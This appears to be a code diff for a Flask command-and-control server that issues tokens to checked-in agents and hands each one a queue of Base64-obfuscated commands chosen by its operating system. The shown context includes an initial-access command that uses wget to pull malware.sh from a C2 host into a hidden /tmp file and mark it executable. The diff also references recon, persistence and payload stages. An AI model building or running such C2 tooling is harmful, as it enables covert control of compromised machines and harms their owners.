@@ -14,6 +14,8 @@ import base64
 import logging
 import time
 from flask import Flask, request, jsonify
+import secrets
+import time
 
 app = Flask(__name__)
 
@@ -22,15 +24,6 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(me
 
 # Dictionary mapping agent IDs to a list (queue) of commands.
 # Each command is a dictionary with details such as type, payload, and timestamp.
-import time
-
-
-
-
-
-# order = [recon_commands, persistence_commands]
-
-
 initial_access_commands = {
     "linux": [
         { "cmd": "wget http://C2_IP/malware.sh -O /tmp/.malware && chmod +x /tmp/.malware", "type": "download", "timestamp": time.time() },
@@ -164,21 +157,29 @@ order = [
     payload_commands,
 ]
 
+agent_orders = {} 
 
 # Dictionary to log metrics for each agent (e.g., last check-in time, response times).
 agent_metrics = {}
+token_to_agent = {}
 
-@app.route('/c2', methods=['POST'])
-def c2_endpoint():
-    """
-    Primary endpoint for agent check-ins.
-    Agents send a JSON payload with their "id". The server responds with the next command (if any).
-    """
+
+def get_order(ops):
+    '''
+    function to retrieve specific commands based on the os of the agent's system 
+    '''
+    return [cmd[ops] for cmd in order]
+
+@app.route('/overview', methods=['POST'])
+def check_in():
+    '''
+    function to verify connection to client and send secret keys
+    '''
     try:
         data = request.get_json(force=True)
-
-        stg = data.get("stg")
-        ops = data.get('ops')
+        aid = data['aid']
+        stg = data['stg']
+        ops = data['ops']
 
         if not stg:
             logging.warning("Received invalid stage command")
@@ -187,22 +188,78 @@ def c2_endpoint():
         if not ops:
             logging.warning("Received invalid os identification command")
             return jsonify({"error": "Mssing operating system identification"}), 400
+        
+        checkin_time = time.time()
+        token = secrets.token_hex(16)
 
+        # creating a seperate cmd queue for each agent 
+        agent_orders[aid] = get_order(ops)
+
+        agent_metrics[aid] = {
+            'stg': stg,
+            'ops': ops,
+            'last_checkin': checkin_time,
+            'token': token
+        }
+
+        token_to_agent[token] = aid
+
+        logging.info(f"Agent '{stg}' with OS '{ops}' checked in at {checkin_time:.2f}. Token issued.")
+
+        resp = {
+            'status': 'Success', 
+            'timestamp': checkin_time,
+            'token': token
+        }
+
+        return jsonify(resp), 200 
+    
+    except Exception as e:
+        logging.error(f"Error processing agent check-in: {e}")
+        return jsonify({"error": "Invalid request format"}), 400
+
+
+@app.route('/cmd', methods=['POST'])
+def c2_endpoint():
+    """
+    Primary endpoint for passing cmds.
+    Only activated after agents have successfully checked in. 
+    Agents send a JSON payload with their "id". The server responds with the next command (if any).
+    """
+    try:
+        data = request.get_json(force=True)
+        token = data.get("token")
+
+        if not token:
+            return jsonify({"error": "Missing token"}), 400
+        
+        agent_id = token_to_agent.get(token)
+
+        if not agent_id:
+            logging.warning({'Invalid token access attempt found. Stopping Command Dispatch'})
+            return jsonify({"error": "Invalid token"}), 400
+        
+        
         # Record the check-in time for metrics.
         checkin_time = time.time()
-        agent_metrics.setdefault((stg), {})['last_checkin'] = checkin_time
-        logging.info(f"Agent at stage={stg} checked in at {checkin_time:.2f}")
+        agent_metrics.setdefault((agent_id), {})['last_checkin'] = checkin_time
+        logging.info(f"Agent aid={agent_id} checked in at {checkin_time:.2f}")
 
-        if(order.get(stg) and len(order[stg][ops]) > 0):
-            command_data = order[stg][ops].pop(0)
+        # if(order.get(stg) and len(order[stg][ops]) > 0):
+        #     command_data = order[stg][ops].pop(0)
+        #     command_text = command_data.get("cmd")
+        # else:
+        #     command_text = "NOP"
+
+        if(agent_orders.get(agent_id) and len(agent_orders[agent_id]) > 0):
+            command_data = agent_orders[agent_id].pop(0)
             command_text = command_data.get("cmd")
         else:
-            command_text = "NOP"
+            command_text = 'NOP'
         
         # Encode the command using URL-safe Base64 encoding.
         encoded_command = base64.urlsafe_b64encode(command_text.encode()).decode()
         response = {
-            "stg": stg,
             "status": "active",
             "timestamp": checkin_time,
             "cmd": encoded_command  # The command is delivered in an obfuscated format.
